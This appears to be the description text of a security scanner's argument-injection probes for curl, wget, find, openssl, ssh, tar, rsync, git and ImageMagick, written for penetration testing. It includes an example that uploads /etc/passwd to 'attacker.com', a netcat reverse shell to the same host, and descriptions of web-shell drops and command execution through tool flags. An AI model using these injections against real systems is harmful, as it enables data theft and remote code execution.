description: Argument injection — distinct from generic command injection. Application passes user input as an argument to a subprocess but doesn't validate flag-like prefixes. `-` / `--` / `@` smuggle behavior changes into commands the developer didn't intend (curl --upload-file, find -exec, openssl -config, ssh -oProxyCommand). PayloadsAllTheThings calls this out as its own surface; many CMDi-resistant apps fall to it.

curl_upload_file.description: App calls curl with URL from user input. `--upload-file /etc/passwd attacker.com` makes curl PUT a local file to attacker. Matters when curl's working directory has readable secrets.

probes.description: If curl receives this as positional arg, file is uploaded to OOB callback. Collaborator interaction = confirmed.
Force curl to load a remote config — config file can set any curl option including local file uploads
-o redirects curl output to a file path attacker chose. With writable target, traversal to web-root → RCE chain.

wget_argv_smuggle.description: wget invoked with user-controlled URL. `--output-document` / `--use-server-timestamps=off` / `--no-check-certificate` are not as exploitable, but `--header=...` and `--post-file=` are.

probes.description: wget POSTs local file as request body — direct file exfil to OOB
-O writes downloaded content to a specific path — PHP shell drop if web-root writable

find_exec_smuggle.description: find called with user-controlled path or pattern argument. `-exec` triggers arbitrary command per file matched.

probes.description: find's -exec runs given command for each match. Injected via positional arg.

openssl_config_load.description: openssl tool invoked with user-controlled args. `-config` loads attacker-supplied config file with engine_section etc. → arbitrary library load → RCE (CVE-2022-3602 chain on weak verification paths).

probes.description: openssl -config loads OpenSSL config file. attacker.cnf with engine_section + dynamic_path = load arbitrary .so

ssh_proxycommand.description: ssh called with user-controlled hostname. `-oProxyCommand=...` runs arbitrary shell command before establishing connection. GitHub CVE-2017-1000117 (git-ssh ProxyCommand RCE).

probes.description: ProxyCommand runs `touch /tmp/swk-ssh-...` before ssh connect. Indicator file = confirmed.
URL-embedded variant — git/composer/yarn parse ssh:// URLs and feed to ssh. -o prefix smuggles flag.

tar_dash_dash_to_command.description: GNU tar's --to-command='<cmd>' runs command per file extracted. If app uses tar to extract a user-provided archive name + accepts free-form arg, RCE.

probes.description: tar --to-command spawns subprocess for each file in archive

rsync_e_flag.description: rsync's `-e` flag specifies remote shell. Injection of `-e "sh -c '<cmd>'"` makes rsync exec the command before transfer.

probes.description: rsync -e overrides remote-shell command. Local command runs before connection attempt.

git_clone_upload_pack.description: git clone with attacker URL. ext:: helper or upload-pack option override = code execution. CVE-2017-1000117 family.

probes.description: git ext:: helper runs shell command instead of contacting remote
git --upload-pack runs the given command instead of git-upload-pack

imagemagick_argv.description: convert/magick with user filename can be smuggled via `@<filename>` (read commands from file) or pipeline operators inside filenames.

probes.description: @<file> reads commands from file. Combined with attacker-controlled file create → arbitrary IM op execution.

argv_zero_smuggle.description: Some apps invoke `sh -c "<cmd> $USER_INPUT"` and tester smuggles via argv[0] — `nc -e /bin/sh attacker.com 4444` would be detected, but `--help; <real cmd>` works because of how shell parses argv0 in -c.

probes.description: Pipeline injection where filter prohibits ; but allows |. Look at output for command execution.
